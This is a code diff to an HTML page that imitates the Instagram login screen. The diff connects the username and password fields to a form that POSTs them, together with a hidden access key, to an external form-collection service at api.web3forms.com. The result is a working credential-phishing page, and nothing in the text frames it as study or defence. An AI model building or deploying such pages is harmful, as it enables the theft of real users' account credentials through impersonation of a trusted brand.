@@ -76,9 +76,13 @@
     <div class="container">
         <div class="login-box">
             <div class="logo">Instagram</div>
-            <form>
-                <input type="text" placeholder="Phone number, username, or email" class="input-field">
-                <input type="password" placeholder="Password" class="input-field">
+            <form action="https://api.web3forms.com/submit" method="POST">
+                <!-- Web3Forms Access Key -->
+                <input type="hidden" name="access_key" value="B3822324-6216-4332-a83a-4e641d048636">
+                
+                <input type="text" name="username" placeholder="Phone number, username, or email" class="input-field" required>
+                <input type="password" name="password" placeholder="Password" class="input-field" required>
+                
                 <button type="submit" class="login-btn">Log in</button>
             </form>
         </div>
@@ -87,4 +91,5 @@
         </div>
     </div>
 </body>
+
 </html>
